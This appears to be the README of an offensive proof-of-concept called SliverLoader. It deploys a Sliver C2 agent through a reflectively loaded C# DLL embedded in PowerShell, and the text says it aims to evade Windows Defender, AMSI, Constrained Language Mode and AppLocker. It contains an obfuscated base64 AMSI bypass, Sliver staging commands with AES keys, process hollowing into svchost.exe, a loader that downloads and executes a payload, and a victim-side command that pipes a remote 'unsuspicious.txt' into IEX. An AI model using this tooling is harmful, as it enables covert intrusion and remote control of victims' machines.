# SliverLoader

This proof of concept (PoC) utilizes a DLL and a PowerShell loader to deploy a Sliver Agent, incorporating process injection and hollowing. The shellcode runner is implemented in C# using the .NET Framework 4.0, which is typically pre-installed on Windows 10 and newer systems, and is also available on many updated legacy systems. Execution is facilitated via PowerShell. The PoC aims to bypass defenses including Windows Defender, AMSI, PowerShell Constrained Language Mode, and AppLocker. Additionally, the runner employs HTTPS protocol utilizing custom SSL certificates and keys for staging, and employs AES encryption to further obfuscate the shellcode, enhancing security layers.

## Sliver C2 Setup

The chosen Command and Control (C2) framework is [Sliver](https://github.com/BishopFox/sliver) developed by BishopFox, although the concept is adaptable to other frameworks such as Metasploit or Havoc. Follow the installation instructions provided on the [Getting Started](https://sliver.sh/docs?name=Getting+Started) page of Sliver's wiki to set it up.

The next steps involve setting up the necessary profile, listener, and stage-listener. It is noted that the IP addresses and paths to assets, such as certificates, need to be adjusted to fit the specific environment.

Create a reusable profile for the scenario

```bash
sliver > profiles new -b https://127.0.0.1:443 --skip-symbols --format shellcode --arch amd64 bleed
```

Start the listener with the same port as specified in the profile and the certificate and key generated from metasploit

```bash
sliver > https -L 127.0.0.1 -l 443
```

Start the staging server and add the compression/encryption algorithm.

```bash
sliver > profiles stage -c deflate9 -i '8y/B?E(G+KbPeShV' -k 'D(G+KbPeShVmYq3t' bleed
```

> [!note]
> Older versions of sliver set the compression and encryption in the `stage-listener` command as follows:
> ```bash
> stage-listener --url https://127.0.0.1:8443 --profile custom -C deflate9 --aes-encrypt-key 'D(G+KbPeShVmYq3t' --aes-encrypt-iv '8y/B?E(G+KbPeShV'
> ```

Confirm that our listeners and stagers are ready.

```bash
sliver > jobs
sliver > profiles stage
sliver > implants
```

## Shellcode Runner

The features intended for inclusion in this shellcode runner are support for various staging scenarios offered by the Sliver C2 (such as raw shellcode, compression, AES encryption, and combinations thereof), process hollowing, AMSI bypass, in-memory execution to avoid touching the disk whenever possible, and flexibility in passing arguments without hard-coded parameters, allowing arguments to be passed on the fly. Different approaches could be taken to achieve these goals. The chosen approach involves writing a C# DLL assembly containing all the necessary methods, embedding it in the PowerShell script as a base64 string, decoding the assembly and loading it into the process using reflection, and then specifying the arguments and executing the methods.

## Process Hollowing

Process hollowing is accomplished by injecting shellcode into a process that ideally also generates network traffic to remain more covert. The implementation follows a basic pattern using Win32 APIs such as CreateProcessA, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to inject the code into processes like svchost.exe.

Conditional operations were added to separate different workflows and to allow passing parameters to various methods.

## Powershell Loader

The loader is a PowerShell script hosted on a web server, intended to be downloaded and executed once the attacker gains code execution. The script then loads the stager into memory via reflection and performs the download and execution of the agent from the staging server.

To create the loader, the following steps are neccesarry:

First, the raw bytes of the assembly will need to be copied. For this, a PowerShell command will be used, which will copy the data to the clipboard.

```powershell
PS C:\> get-content -encoding byte -path .\sliverloader.dll | clip
```

Next use [CyberChef](https://cyberchef.io) to convert the data to base64. Convert "From Decimal" with delimiter Line feed "To Base64" with this [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)To_Base64('A-Za-z0-9%2B/%3D')).

As powershell doesn't support **Raw Byte Encoding** which **Sliver C2** expects for **AES Encryption** and hardcoded keys in the assembly are not an option, they keys have to be converted with this [CyberChef recipe](https://cyberchef.io/#recipe=To_Hex('0x%20with%20comma',0)).

Finally copy the converted values to the script as in `Loader.ps1`.

> [!note]
> To fetch a stage 2 payload via HTTP in newer versions of Sliver, you need to query a URL that looks like this: `http://YOUR_IP/whatever.config?x=IMPLANT_ID`.

```powershell
# AMSI Bypass (if needed)
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('U2BlVC1JdGBlbSAoICdWJysnYVInICsgICdJQScgKyAoKCJ7MX17MH0iLWYnMScsJ2JsRTonKSsncTInKSAgKyAoJ3VaJysneCcpICApICggW1RZcEVdKCAgInsxfXswfSItRidGJywnckUnICApICkgIDsgICAgKCAgICBHZXQtdmFySWBBYEJMRSAgKCAoJzFRJysnMlUnKSAgKyd6WCcgICkgIC1WYUwgICkuIkFgc3NgRW1ibHkiLiJHRVRgVFlgUGUiKCggICJ7Nn17M317MX17NH17Mn17MH17NX0iIC1mKCdVdGknKydsJyksJ0EnLCgnQW0nKydzaScpLCgoInswfXsxfSIgLWYgJy5NJywnYW4nKSsnYWdlJysnbWVuJysndC4nKSwoJ3UnKyd0bycrKCJ7MH17Mn17MX0iIC1mICdtYScsJy4nLCd0aW9uJykpLCdzJywoKCJ7MX17MH0iLWYgJ3QnLCdTeXMnKSsnZW0nKSAgKSApLiJnYGV0ZmBpRWxEIiggICggInswfXsyfXsxfSIgLWYoJ2EnKydtc2knKSwnZCcsKCdJJysoInswfXsxfSIgLWYgJ25pJywndEYnKSsoInsxfXswfSItZiAnaWxlJywnYScpKSAgKSwoICAiezJ9ezR9ezB9ezF9ezN9IiAtZiAoJ1MnKyd0YXQnKSwnaScsKCdOb24nKygiezF9ezB9IiAtZid1YmwnLCdQJykrJ2knKSwnYycsJ2MsJyAgKSkuInNFYFRgVmFMVUUiKCAgJHtuYFVMbH0sJHt0YFJ1RX0gKQo=')) | Out-Null

$encodeStr = "TVqQAAMAAAAEAAAA...<SNIP>"

[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($encodeStr))

#$url = "https://$SLIVER_IP:8443/config.woff"
$url = "https://$SLIVER_IP/config.yml?x=$IMPLANT_ID"
$TargetBinary = "svchost.exe"
[byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74
[byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56

$CompressionAlgorithm = "deflate9"
[serpent.Loader]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)
```

## Deployment

The powershell loader is hosted on a webserver as `.txt` file e.g. `unsuspicious.txt`.
On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.

```Powershell
(New-Object System.Net.WebClient).DownloadString('https://some-server/unsuspicious.txt') | IEX
```
